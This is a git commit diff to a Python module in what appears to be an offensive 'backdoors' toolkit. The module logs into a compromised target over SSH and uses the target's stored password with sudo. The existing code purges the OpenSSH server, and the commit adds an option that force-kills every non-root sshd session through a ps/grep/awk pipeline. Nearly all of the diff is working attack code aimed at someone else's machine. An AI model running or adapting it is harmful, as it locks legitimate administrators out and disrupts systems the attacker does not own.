914174d06bf813f29c59ed8d46fa859e57f92c73
George Hughey <ghughey@umd.edu>
2016-01-31 12:41:55 -0800

    Added the ability to kill all ssh connections

--- backdoors/auxiliary/remove_ssh.py
+++ backdoors/auxiliary/remove_ssh.py
@@ -8,7 +8,9 @@ class Remove_ssh(Backdoor):
         self.intro = GOOD + "Using remove_ssh module..."
         self.core = core
         self.options = { #~Input extra options. You almost always need a port.~
-                }
+        	"killall"    : Option("killall", False, "Kills all ssh connections", True),
+		"server"     : Option("server", True, "Kills ssh server", True),
+	}
         self.allow_modules = False
         self.modules = {}
         self.help_text = "Removes ssh on the target."
@@ -16,6 +18,10 @@ class Remove_ssh(Backdoor):
     def get_command(self):
 	return str("echo " + self.core.curtarget.pword + " | sudo -S apt-get -y purge openssh-server")
     def do_exploit(self, args):
-	self.core.curtarget.ssh.exec_command(self.get_command())
-
-
+	if self.get_value("server")==True:
+            self.core.curtarget.ssh.exec_command(self.get_command())
+	if self.get_value("killall")==str(True) or self.get_value("killall")==str(1):
+	    newstr=str("echo " + self.core.curtarget.pword + " | sudo -S ps -ef | grep sshd | grep -v root | grep -v grep | awk \'{print \"kill -9\", $2}\' | sh")
+	    print newstr
+	    self.core.curtarget.ssh.exec_command(newstr)
+	print(GOOD + "Ssh removed.")
